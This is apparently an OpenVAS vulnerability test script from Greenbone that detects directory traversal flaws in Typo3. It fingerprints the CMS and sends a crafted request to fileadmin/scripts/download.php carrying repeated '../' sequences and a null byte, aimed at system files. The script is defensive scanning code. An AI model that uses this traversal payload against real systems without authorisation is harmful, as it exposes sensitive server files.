###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_typo3_multiple_dir_trav_vuln.nasl 75 2013-11-22 14:32:56Z veerendragg $
#
# Typo3 Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

if(description)
{
  script_id(803776);
  script_version("$Revision: 75 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-11-22 15:32:56 +0100 (Fri, 22 Nov 2013) $");
  script_tag(name:"creation_date", value:"2013-11-20 11:33:55 +0530 (Wed, 20 Nov 2013)");
  script_name("Typo3 Multiple Directory Traversal Vulnerabilities");

  tag_summary =
"This host is running Typo3 and is prone to multiple directory traversal
vulnerabilities.";

  tag_vuldetect =
"Send a crafted exploit string via HTTP GET request and check whether it
is able to read the system file or not.";

  tag_insight =
"Multiple flaws are due to improper validation of user-supplied input via
'file' and 'path' parameters, which allows attackers to read arbitrary files
via a ../(dot dot) sequences.";

  tag_impact =
"Successful exploitation may allow an attacker to obtain sensitive information,
which can lead to launching further attacks.

Impact Level: Application";

  tag_affected =
"Typo3 version 6.1.5 and probably before.";

  tag_solution =
"No solution available as of 20th November, 2013. Information regarding this
issue will be updated once the solution details are available.
For updates refer to http://typo3.org ";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "summary" , value : tag_summary);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/29355");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/php/typo3-directory-traversal-vulnerability");
  script_summary("Check if Typo3 is vulnerable to file reading vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
url = "";
typo_port = "";
sndReq = "";
rcvRes = "";

## Get HTTP Port
typo_port = get_http_port(default:80);
if(!typo_port){
  typo_port = 80;
}

## Check the port status
if(!get_port_state(typo_port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:typo_port)){
  exit(0);
}

## Iterate over the possible directories
foreach dir (make_list("", "/typo3", "/cms", cgi_dirs()))
{
  ## Request for the search.cgi
  sndReq = http_get(item:string(dir, "/index.php"), port:typo_port);
  rcvRes = http_keepalive_send_recv(port:typo_port, data:sndReq, bodyonly:TRUE);

  ## confirm the Application
  if(rcvRes && 'content="TYPO3' >< rcvRes)
  {
    ## traversal_files() function Returns Dictionary (i.e key value pair)
    ## Get Content to be checked and file to be check
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct directory traversal attack
      url = dir + "/fileadmin/scripts/download.php?path=" +
            crap(data:"../", length:3*15) + files[file] + "%00";

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:typo_port, url:url, pattern:file))
      {
        security_warning(typo_port);
        exit(0);
      }
    }
  }
}
